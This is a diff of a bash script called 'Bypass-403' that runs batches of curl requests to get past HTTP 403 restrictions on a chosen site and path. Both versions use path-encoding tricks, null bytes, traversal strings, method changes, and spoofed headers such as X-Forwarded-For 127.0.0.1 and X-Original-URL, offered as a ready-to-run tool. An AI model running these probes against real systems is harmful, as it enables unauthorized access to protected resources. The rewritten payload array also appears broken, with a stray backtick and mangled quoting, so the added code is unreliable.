@@ -1,61 +1,34 @@
-#! /bin/bash
-figlet Bypass-403
-echo "                                               By Iam_J0ker"
-echo "./bypass-403.sh https://example.com path"
-echo " "
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
-echo "  --> ${1}/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
-echo "  --> ${1}/%2e/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
-echo "  --> ${1}/${2}/."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
-echo "  --> ${1}//${2}//"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
-echo "  --> ${1}/./${2}/./"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
-echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
-echo "  --> ${1} -H X-rewrite-url: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
-echo "  --> ${1}/${2}%20"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
-echo "  --> ${1}/${2}%09"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
-echo "  --> ${1}/${2}?"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
-echo "  --> ${1}/${2}.html"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
-echo "  --> ${1}/${2}/?anything"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
-echo "  --> ${1}/${2}#"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
-echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
-echo "  --> ${1}/${2}/*"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
-echo "  --> ${1}/${2}.php"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
-echo "  --> ${1}/${2}.json"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2}  -X TRACE"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
-echo "  --> ${1}/${2}..;/"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
-echo "  --> ${1}/${2};/"
-#updated
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2} -X TRACE"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
-echo "Way back machine:"
-curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
+#!/bin/bash
 
+if [ $# -ne 2 ]; then
+    echo "Usage: $0 <base_url> <endpoint>"
+    exit 1
+fi
+
+declare -a curl_payloads=(
+    "$1/$2%5c"
+    "$1/$2%2F"
+    "$1/$2+"
+    "-H \"Range: bytes=0-10\" $1/$2"
+    "-H \"Accept-Encoding: gzip,deflate\" $1/$2"
+    "-H \"X-Original-Host: malicious.com\" $1/$2"
+    "$1/$2`"
+    "-X PATCH $1/$2"
+    "-H \"Authorization: Bearer some_token\" $1/$2"
+    "$1/%09$2"
+    "$1/$2%00"
+    "$1/$2,%00"
+    "$1/$2/..//..//"
+    "$1/$2/?v=1/"
+    "-H \"Connection: Upgrade\" -H \"Upgrade: websocket\" $1/$2"
+    "-H \"If-None-Match: some-etag-value\" $1/$2"
+    "$1/$2~"
+    "-H \"X-Forwarded-Proto: https\" $1/$2"
+    "-H \"Accept: */*\" $1/$2"
+    "-H \"Expect: 100-continue\" $1/$2"
+)
+
+for payload in "${curl_payloads[@]}"; do
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $payload
+    echo "  --> $payload"
+done
